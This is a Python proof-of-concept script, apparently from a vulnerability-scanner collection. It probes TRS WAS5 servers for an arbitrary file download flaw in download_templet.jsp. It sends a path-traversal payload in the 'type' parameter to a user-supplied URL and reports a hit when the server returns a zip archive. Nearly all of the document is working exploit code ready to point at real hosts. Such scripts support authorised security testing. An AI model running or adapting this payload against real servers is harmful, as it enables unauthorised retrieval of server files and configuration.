#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: TRS was5 download_templet.jsp任意文件下载
referer: http://reboot.cf/2017/01/12/TRS%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86
author: Lucifer
description: download_templet.jsp参数type存在任意文件下载,下载文件均为压缩包。
'''
import sys
import requests
import warnings
sys.path.append('../../')
from color import *

class trs_was5_download_templet:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/was5/admin/template/download_templet.jsp?type=../web/inc"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"x-zip-compressed" in req.headers["Content-Type"]:
                printGreen("[+]Success:存在TRS was5 download_templet.jsp任意文件下载漏洞...(高危)\tpayload: "+vulnurl)
            else:
                printBlue("[-]Info:不存在trs_was5_download_templet漏洞")

        except:
            printYellow("[-]Warning:"+self.__class__.__name__+" ==>可能不存在漏洞")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = trs_was5_download_templet(sys.argv[1])
    testVuln.run()